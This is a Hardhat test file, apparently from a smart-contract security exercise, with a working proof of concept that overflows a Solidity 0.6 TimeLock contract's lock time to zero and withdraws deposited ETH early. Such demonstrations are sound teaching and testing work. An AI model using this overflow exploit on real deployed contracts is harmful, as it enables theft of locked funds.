const { expect } = require("chai");
const { ethers } = require("hardhat");

// This contract uses solidity 0.6 and has unsafe arithmetics. We can use the increaseLockTime
// function to generate an owerflow and reset the timelock to 0 (or any value in the past).
// Steps:
// 1- Deposit some ETH.
// 2- Find the increase that will make the timelock value overflow, which is
//    2^256 - current timelock + 1
// 3- Call increase with the value from the previous step. This will make the variable overflow
//    and reset it to 0.
// 4- Calling withdraw now works since the timelock is in the past.
describe("Timelock", function () {
  let timelock;

  beforeEach(async function() {
    const TimeLock = await ethers.getContractFactory("TimeLock");
    timelock = await TimeLock.deploy();
  });

  it("can be hacked", async function() {
    const [owner] = await ethers.getSigners();

    const value = ethers.utils.parseEther("1");

    await timelock.deposit({ value });

    const locktime = await timelock.lockTime(owner.address);
    const increase = ethers.constants.MaxUint256.sub(locktime).add(1);

    await timelock.increaseLockTime(increase);

    await expect(() =>
      timelock.withdraw()
    ).to.changeEtherBalance(owner, value);
  });
});
